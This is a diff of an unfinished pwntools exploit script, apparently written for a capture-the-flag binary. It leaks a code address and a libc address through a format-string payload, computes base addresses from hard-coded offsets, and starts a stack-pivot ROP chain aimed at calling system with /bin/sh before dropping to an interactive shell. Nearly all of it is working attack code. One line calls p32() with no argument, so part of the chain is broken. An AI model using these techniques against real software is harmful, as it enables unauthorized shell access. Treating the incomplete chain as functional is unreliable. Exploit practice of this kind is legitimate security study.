@@ -16,14 +16,39 @@ p = gdb.debug(fileName, gdbscript='''r''',env={"SHELL": "/bin/sh"})
 #p.sendline(line)
 #p.sendline(p64(line))
 
-# 10%p = .description leak 11%p = libc leak
+# 6%p = description leak 7%p = libc leak
 p.recvuntil(b'Exit\n')
-p.sendline('settings uptime %11$p %7$p')
-p.sendline('info uptime\n')
+p.sendline(b'settings uptime %6$p %7$p')
+p.sendline(b'info uptime\n')
 p.recvuntil(b'updated.\n> ')
 leaks = p.recvline().decode()
 leakedAddresses = leaks.split()
 descriptionLeak = leakedAddresses[0]
 libcLeak = leakedAddresses[1].partition('>')[0] # removes that >
 print(f"Desc leak = {descriptionLeak} libcLeak = {libcLeak}")
+stdinOffset = 0x1F75C0
+descriptionOffset = 0x3020
+libcBase = int(libcLeak,16) - stdinOffset
+codeBase = int(descriptionLeak,16) - descriptionOffset
+print(f"Libc base = {hex(libcBase)}")
+print(f"Code base = {hex(codeBase)}")
+
+# First rop chain on with sprintf needs to pivot stack pointer to description buffer, then second rop chain to call system with /bin/sh
+# We need to build the second rop chain first
+secondRopChain = b'settings description'
+secondRopChain += p32()
+
+
+
+p.sendline(secondRopChain)
+
+# Now the first small rop chain to go to the second rop chain, stack pivot
+p.sendline(b'query AAAAAAAABBBBBBBBCCCCC' + p32(int(descriptionLeak,16)) + p32(codeBase+0x00000331-4))
+
+
+
+
+
+
+
 p.interactive()
